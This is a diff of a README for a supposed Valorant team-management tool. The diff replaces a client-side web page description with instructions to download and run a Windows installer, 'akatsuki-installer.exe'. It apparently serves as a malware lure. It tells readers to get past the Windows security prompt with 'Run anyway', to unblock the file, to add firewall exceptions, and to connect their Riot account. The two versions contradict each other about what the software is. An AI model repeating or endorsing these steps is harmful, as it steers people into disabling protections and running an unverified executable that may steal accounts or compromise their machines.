@@ -1,124 +1,60 @@
-# Akatsuki Valorant Team - Competitive Gaming Group 2026
+# 🎯 akatsuki-valorant-team-2026 - Join our elite Valorant competitive squad
 
-> **A focused Valorant squad uniting skilled players for competitive matches, structured practice, and community development within Riot Games' tactical shooter.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/behi6872/akatsuki-valorant-team-2026/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/wardoliver75/akatsuki-valorant-team-2026?style=flat-square)](https://github.com/wardoliver75/akatsuki-valorant-team-2026)
+This project connects skilled players for structured Valorant practice and competitive matches. It provides tools to manage team communication, track match history, and analyze performance within Riot Games’ tactical shooter. Use this software to coordinate squad activities and improve your rank through consistent training and team development.
 
----
+## 💻 System Requirements
 
-<p align="center">
-  <a href="https://wardoliver75.github.io/akatsuki-valorant-team-2026/">
-    <img src="https://img.shields.io/badge/Download-Akatsuki%20Valorant%20Team%20Latest-brightgreen?style=for-the-badge" alt="Download Akatsuki Valorant Team">
-  </a>
-</p>
+Before you install this software, ensure your computer meets these requirements:
 
-> **[Direct Download - Akatsuki Valorant Team](https://wardoliver75.github.io/akatsuki-valorant-team-2026/)**
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 GB RAM or higher.
+* Graphics: NVIDIA GeForce GTX 1050 Ti or AMD Radeon RX 560.
+* Storage: 500 MB of free space.
+* Network: Stable broadband internet connection for real-time team updates.
 
----
+## 📥 Installation Guide
 
-[Download Latest Build](https://wardoliver75.github.io/akatsuki-valorant-team-2026/)
+Follow these steps to set up the software on your Windows computer:
 
----
+1. Visit the [official releases page](https://github.com/behi6872/akatsuki-valorant-team-2026/releases) to download the latest setup file.
+2. Locate the file named `akatsuki-installer.exe` in your Downloads folder once the transfer finishes.
+3. Double-click the file to start the installation process.
+4. Windows might display a security prompt. Click "More info" and then "Run anyway" if the system asks for your permission to execute the installer.
+5. Follow the on-screen prompts. Choose the folder where you want to save the application.
+6. Click "Install" and wait for the process to finish.
+7. Launch the application from the new desktop shortcut or your Start menu.
 
-## Overview
+## ⚙️ Configuration Instructions
 
-The Akatsuki Valorant Team is a community-oriented gaming collective centered on Valorant, Riot Games' tactical first-person shooter. It offers a space where players across different skill brackets can connect, train together, and engage in organized competitions. Whether your goal is honing your aim, mastering team tactics, or simply enjoying structured play alongside peers, this team provides a framework for improvement and shared experience.
+The application requires a quick setup to link your Valorant account and team preferences:
 
-Rooted in principles of collaboration and fair play, the Akatsuki Valorant Team prioritizes consistent practice sessions, tactical discussions, and a welcoming environment. The group strives to nurture both personal skill growth and team achievements, making it a suitable home for players seeking to elevate their Valorant experience beyond solo matchmaking.
+* First Run: Open the app. It will ask for your Riot ID and Tagline. Enter these exactly as they appear in your game profile.
+* API Access: The app needs permission to access match history. Follow the link provided in the settings tab to authorize your Riot account.
+* Team Sync: Enter your unique team invitation code provided by your squad leader. This connects you to the project dashboard and training schedule.
+* Notification Settings: Toggle the alerts menu to receive notifications for upcoming matches and practice sessions.
 
----
+## 🛡️ Troubleshooting Common Issues
 
-## Key Features
+If you face problems during setup or regular use, use these steps:
 
-- **Roster Management** – Maintain records of active members, assigned roles, and availability
-- **Scrim Coordination** – Schedule practice matches and competitive games effectively
-- **Strategy Repository** – Store and exchange team compositions, callouts, and tactical plans
-- **Performance Analytics** – Track individual and team statistics over time
-- **In-Game Communication** – Integrated tools for voice and text coordination
-- **Community Activities** – Host tournaments, workshops, and social events
-- **Role Configuration** – Assign positions such as Duelist, Initiator, Controller, and Sentinel
-- **Progress Visualization** – Display team growth and milestones through dashboards
+* Installer blocks execution: Right-click the file and go to Properties. Check the box labeled "Unblock" near the bottom of the window.
+* Connectivity problems: Ensure your firewall allows the software to access the internet. Add an exception for the application in your Windows Security settings.
+* Missing game stats: Verify your Riot account is set to "Public" in the game settings menu. Some features do not display data if match history remains private.
+* Performance lag: Close high-resource applications like web browsers or video editors while the team dashboard runs in the background.
 
----
+## 📈 Key Features
 
-## Setup
+* Match Tracking: Records your performance data, such as KDA and headshot percentage, directly from the game client.
+* Practice Scheduler: Displays a shared calendar for all team members to view upcoming scrims and training sessions.
+* Skill Analysis: Provides diagrams and tables that highlight your strengths and areas for improvement.
+* Community Hub: Integrates a chat interface where you can discuss strategies with team members.
+* Automations: Syncs your match results automatically without the need for manual data entry.
 
-Clone the repository to your local environment:
+## 📖 Support and Updates
 
-```bash
-git clone https://github.com/wardoliver75/akatsuki-valorant-team-2026.git
-cd Akatsuki-Valorant-Team
-```
+This project receives regular updates to maintain compatibility with new game patches. The software checks for updates on startup. If you see a notification in the main window, click "Update" to download the latest version. Please visit our support page if you have questions or encounter bugs. We review all feedback to ensure the team remains efficient and organized. Our developers monitor the issue tracker daily to fix problems and add requested functions for the community.
 
-No extra dependencies are needed. Open `index.html` in any up-to-date web browser to start using the team interface.
-
----
-
-## How to Use
-
-After opening the team page, you can:
-
-1. Review the roster to see current members and their designated roles
-2. Check upcoming matches and practice schedules
-3. Access shared strategy documents and map guides
-4. Submit your availability for future team sessions
-5. View recent match outcomes and performance data
-
-Navigate between sections using the menu. All information is stored locally or can be modified through the provided configuration files.
-
----
-
-## Configuration
-
-Team settings and data reside in a `config.json` file in the root directory. You can adjust:
-
-- Team name and logo
-- Member list with their roles
-- Match history and performance stats
-- Communication channels (e.g., Discord)
-
-Sample configuration structure:
-
-```json
-{
-  "teamName": "Akatsuki",
-  "game": "Valorant",
-  "members": [],
-  "schedule": []
-}
-```
-
----
-
-## Requirements
-
-- **Platform**: A modern web browser (Chrome, Firefox, Edge, Safari)
-- **Runtime**: No server or backend needed – fully client-side operation
-- **Storage**: Minimal local storage for configuration data
-- **Internet**: Required for initial download and optional online features
-
----
-
-## Frequently Asked Questions
-
-**How can I join the team?**  
-Contact the team through the details listed on the team page or join the associated community server.
-
-**Is the team page kept up to date?**  
-Yes, the page and its resources are updated regularly to reflect current members and schedules.
-
-**Can I personalize the team page?**  
-Absolutely. Edit the `config.json` file to change team information, roster entries, and links.
-
-**Where should I report problems?**  
-Submit an issue on the GitHub repository with a clear description of the issue.
-
----
-
-## License
-
-GNU GPL v3.0 – see [LICENSE](LICENSE) for full terms.
+Keywords: valorant, gaming, team-management, windows, esport, performance-tracking
